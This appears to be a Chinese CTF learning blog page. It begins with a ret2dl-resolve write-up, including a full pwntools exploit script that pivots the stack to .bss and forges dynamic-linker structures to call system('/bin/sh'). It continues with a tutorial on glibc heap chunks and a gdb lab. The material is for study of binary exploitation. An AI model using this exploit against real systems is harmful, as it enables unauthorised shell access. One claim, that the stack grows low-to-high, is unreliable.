<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vuln()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目思路非常清晰，read函数存在栈溢出，但是没有libc，ROPgadget也很少，这里就可以考虑ret2dl-resolve，我们先将栈转移到bss段，然后构造结构体，实现对system函数的解析，然后getshell</p>
<p>第一处payload负责栈转移，将eip覆盖为.rel.plt地址，传递一个可控的rel_offset，使rel_entry落在可控区域</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">108</span> + p32(bss_addr - <span class="number">20</span>) + p32(elf.plt[<span class="string">'read'</span>]) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_addr - <span class="number">20</span>) + p32(<span class="number">0x50</span>)</span><br></pre></td></tr></table></figure>
<p>第二处的payload负责伪造rel_entry使sym_entry落在可控区域，伪造sym_entry使sym_name为‘system’</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload2 = p32(<span class="number">0x0</span>) <span class="comment"># pop ebp, 随便设反正不用了</span></span><br><span class="line">payload2 += p32(DYN_RESOL_PLT) <span class="comment"># resolve的PLT，就是前面说的push link_map那个位置</span></span><br><span class="line">payload2 += p32(FAKE_REL_OFF) <span class="comment"># 伪造的重定位表OFFSET</span></span><br><span class="line">payload2 += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># 返回地址</span></span><br><span class="line">payload2 += p32(bin_sh) <span class="comment"># 参数'/bin/sh'</span></span><br><span class="line">payload2 += fake_rel_plt + fake_dynsym + fake_dynstr</span><br></pre></td></tr></table></figure>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line"><span class="comment">#r = remote("",)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">rel_plt_addr = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym_addr = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr_addr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x804a300</span> <span class="comment"># readelf -S main =&gt; .bss</span></span><br><span class="line">DYN_RESOL_PLT = <span class="number">0x8048380</span> <span class="comment"># readelf -S main =&gt; .plt</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary main --only "leave|ret"</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt_addr = bss_addr</span><br><span class="line">fake_dynsym_addr = fake_rel_plt_addr + <span class="number">0x8</span></span><br><span class="line">fake_dynstr_addr = fake_dynsym_addr + <span class="number">0x10</span></span><br><span class="line">bin_sh = fake_dynstr_addr + <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">FAKE_REL_OFF = fake_rel_plt_addr - rel_plt_addr</span><br><span class="line">r_info = (((fake_dynsym_addr - dynsym_addr)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">str_off = fake_dynstr_addr - dynstr_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">108</span> + p32(bss_addr - <span class="number">20</span>) + p32(elf.plt[<span class="string">'read'</span>]) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_addr - <span class="number">20</span>) + p32(<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'!\n'</span>)</span><br><span class="line">r.sendline(payload) <span class="comment"># stack immigration</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt = p32(elf.got[<span class="string">'read'</span>])+p32(r_info)</span><br><span class="line">fake_dynsym = p32(str_off) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12000000</span>)</span><br><span class="line">fake_dynstr = <span class="string">"system\x00/bin/sh\x00\x00"</span></span><br><span class="line"></span><br><span class="line">payload2 = p32(<span class="number">0x0</span>) + p32(DYN_RESOL_PLT) + p32(FAKE_REL_OFF) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh) + fake_rel_plt + fake_dynsym + fake_dynstr</span><br><span class="line"></span><br><span class="line">r.sendline(payload2) <span class="comment"># construct a fake structure</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="0x02：总结"><a href="#0x02：总结" class="headerlink" title="0x02：总结"></a>0x02：总结</h3><p>这个脚本可以保存一份，以后遇到类似的题目可以直接套用脚本</p>
<p><strong>参考链接</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bbs.pediy.com/thread-227034.htm</span><br></pre></td></tr></table></figure>
<h1 id="0x02：Heap-Attack"><a href="#0x02：Heap-Attack" class="headerlink" title="0x02：Heap Attack"></a>0x02：Heap Attack</h1><h2 id="Glibc-Heap"><a href="#Glibc-Heap" class="headerlink" title="Glibc Heap"></a>Glibc Heap</h2><p>本文实验环境主要是在Linux下，对Linux的堆知识进行整理和总结，也算是对许多资料的一个整理，和Windows相比，Linux下的堆管理机制并没有那么的严谨，导致了许多攻击的产生，下面就从概念开始分析Linux堆管理机制</p>
<h3 id="堆定义"><a href="#堆定义" class="headerlink" title="堆定义"></a>堆定义</h3><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域。我们一般称管理堆的那部分程序为堆管理器，与栈不同的是堆由<strong>低地址向高地址方向增长</strong>，而栈由低地址向高地址方向增长。下面这张图可以很清楚的说明：</p>
<p><img src="/2020/02/09/Linux-Pwn-Learning/1.png" alt="1"></p>
<p>注:本文提到的堆是基于<strong>glibc 库下的 ptmalloc2堆管理器</strong></p>
<h3 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h3><h4 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h4><p>我们首先来看堆结构的源码，这里我们申请的每一个堆即是一个chunk结构，它有个名字叫做<code>malloc_chunk</code>，非常有意思的是，<strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>各个字段解释如下</p>
<ul>
<li><p><strong>prev_size</strong></p>
<p>负责记录前一块chunk的大小，<strong>只有在前面一个堆块是空闲的时候才有值</strong>。前面一个堆块在使用时，他的值始终为 0</p>
</li>
<li><p><strong>size</strong></p>
<p>记录该 chunk 的大小，大小必须是 2 <em> SIZE_SZ 的整数倍。如果申请的内存大小不是 2 </em> SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位有如下的作用</p>
<ul>
<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li>
<li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li>
</ul>
</li>
<li><p><strong>fd，bk</strong></p>
<p>chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下</p>
<ul>
<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
</ul>
</li>
<li><p><strong>fd_nextsize， bk_nextsize</strong></p>
<p>也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</p>
<ul>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li>
</ul>
</li>
</ul>
<h4 id="Allocated-chunk"><a href="#Allocated-chunk" class="headerlink" title="Allocated chunk"></a>Allocated chunk</h4><p>一个已经分配的chunk以及后一块chunk状态如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<h4 id="Freed-chunk"><a href="#Freed-chunk" class="headerlink" title="Freed chunk"></a>Freed chunk</h4><p>被释放的 chunk 被记录在链表中，可能是循环双向链表，也可能是单向链表，状态如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&apos; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&apos; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<h4 id="malloc大小计算"><a href="#malloc大小计算" class="headerlink" title="malloc大小计算"></a>malloc大小计算</h4><p>对于正在使用的 chunk，它的下一个 chunk 的 prev_size 是无效的，这块内存也可以被当前 chunk 使用，这也就存在了空间的复用，因此对于使用中的 chunk 大小计算公式是：<code>chunk_size = （用户请求大小 + (2 -1) * sizeof(INTERNAL_SIZE_T)) aligh to 2 * sizeof(size_t)</code></p>
<p>比如我们在64位系统中 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">8</span>)</span><br><span class="line"><span class="comment">// 申请到的chunk: 16 + 8 + 8 + 1 = 0x21</span></span><br></pre></td></tr></table></figure>
<ol>
<li>第一个 16 字节是<strong>系统最小分配的内存</strong>，也就是说你如果想要申请的内存小于系统最小分配的内存的话，就会按照最小的内存来分配，在 64 位系统中这个值是 16 个字节，在 32 位系统中是 8 个字节，如果代码中是 malloc(0) 的话，<strong>堆管理器也会分配最小内存空间给你</strong></li>
<li>第二个 8 字节是 pre size 字段的大小（32 位的为 4 字节）</li>
<li>第三个 8 字节为 size 字段的大小（32 位的为 4 字节）</li>
<li>最后一个 1 字节是 <strong>PREV_INUSE </strong>的值，只有 0 或 1两个值</li>
</ol>
<h4 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h4><p>为了搞清楚堆的结构我们首先做一个实验，构造如下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	    <span class="keyword">char</span> *p;</span><br><span class="line">	    p = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">		<span class="built_in">memcpy</span>(p,<span class="string">"aaaaa"</span>,<span class="number">5</span>);</span><br><span class="line">		<span class="built_in">free</span>(p);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序先用malloc函数申请了一块内存，然后向内存中拷贝了5个a，最后释放了这块内存，我们在gdb中观察堆的结构，我们首先运行到malloc函数，用vmmap观察内存布局，这里没有生成堆</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555555554000     0x555555555000 r-xp     1000 0      /home/thunder/Desktop/codes/ctf/pwn/heap/heap1</span><br><span class="line">    0x555555754000     0x555555755000 r--p     1000 0      /home/thunder/Desktop/codes/ctf/pwn/heap/heap1</span><br><span class="line">    0x555555755000     0x555555756000 rw-p     1000 1000   /home/thunder/Desktop/codes/ctf/pwn/heap/heap1</span><br><span class="line">    0x7ffff7a3a000     0x7ffff7bcf000 r-xp   195000 0      /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7bcf000     0x7ffff7dcf000 ---p   200000 195000 /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7dd3000 r--p     4000 195000 /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd5000 rw-p     2000 199000 /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7dd5000     0x7ffff7dd9000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd9000     0x7ffff7dfc000 r-xp    23000 0      /usr/lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">    0x7ffff7fd6000     0x7ffff7fd8000 rw-p     2000 0      </span><br><span class="line">    0x7ffff7ff4000     0x7ffff7ff7000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 23000  /usr/lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 24000  /usr/lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
<p>我们单步一下，观察malloc函数之后的返回值，即rax中保存的值，也就是指向我们chunk的地址，需要注意的是这里<strong>malloc函数返回的指针指向的是我们chunk中的user data(用户数据区)</strong>，我们继续用vmmap观察内存布局，此时已经可以看到我们申请的heap区，然而系统却给了我们大小<code>0x555555777000 - 0x555555756000 = 21000‬</code>的空间，这并不是系统在浪费资源，这是一种提高效率的做法，在下一次我们申请内存的时候就从这块内存里直接取，当这一块内存不足的时候才会向系统索取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555555554000     0x555555555000 r-xp     1000 0      /home/thunder/Desktop/codes/ctf/pwn/heap/heap1</span><br><span class="line">    0x555555754000     0x555555755000 r--p     1000 0      /home/thunder/Desktop/codes/ctf/pwn/heap/heap1</span><br><span class="line">    0x555555755000     0x555555756000 rw-p     1000 1000   /home/thunder/Desktop/codes/ctf/pwn/heap/heap1</span><br><span class="line">    0x555555756000     0x555555777000 rw-p    21000 0      [heap] =&gt; 我们申请的chunk</span><br><span class="line">    0x7ffff7a3a000     0x7ffff7bcf000 r-xp   195000 0      /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7bcf000     0x7ffff7dcf000 ---p   200000 195000 /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7dd3000 r--p     4000 195000 /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd5000 rw-p     2000 199000 /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7dd5000     0x7ffff7dd9000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd9000     0x7ffff7dfc000 r-xp    23000 0      /usr/lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">    0x7ffff7fd6000     0x7ffff7fd8000 rw-p     2000 0      </span><br><span class="line">    0x7ffff7ff4000     0x7ffff7ff7000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 23000  /usr/lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 24000  /usr/lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
<p>我们用<code>x/20gx rax</code>查看一下我们刚才申请堆的样子，<code>0x555555756000</code>和<code>0x555555756010</code>这两排既是我们申请的堆，size是<code>0x20 + 1 = 0x21</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756010-32</span><br><span class="line">0x555555755ff0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555555756010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000020fe1</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们继续运行程序到memcpy函数的下一行观察我们的堆，很明显我们将aaaaa写入了我们的user data中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756010-32</span><br><span class="line">0x555555755ff0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555555756010:	0x0000006161616161	0x0000000000000000</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000020fe1</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们继续运行将其释放掉，观察user data的区域已经被清空了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756010-32</span><br><span class="line">0x555555755ff0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555555756010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000020fe1</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>然而并不只是清空那么简单，系统还将把这块内存交给堆管理系统中去，方便下一次申请操作，这里我们用<code>x/10gx &amp;main_arena</code>命令发现我们的堆已经连到了main_arena + 0x8中，并且连接的是堆的头部</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx &amp;main_arena</span><br><span class="line">0x7ffff7dd3b00 &lt;main_arena&gt;:	0x0000000000000000	0x0000555555756000</span><br><span class="line">0x7ffff7dd3b10 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd3b20 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd3b30 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd3b40 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>所以我们可以总结一下free函数</p>
<ul>
<li>清空user data的数据</li>
<li>将此chunk放入堆管理器中</li>
</ul>
<h4 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h4><p>main_arena 就是 ptmalloc2 堆管理器通过与操作系统内核进行交互申请到的，也就是我们一开始申请到的那么一大块内存，因为是主线程分配的，所以叫 main_arena </p>
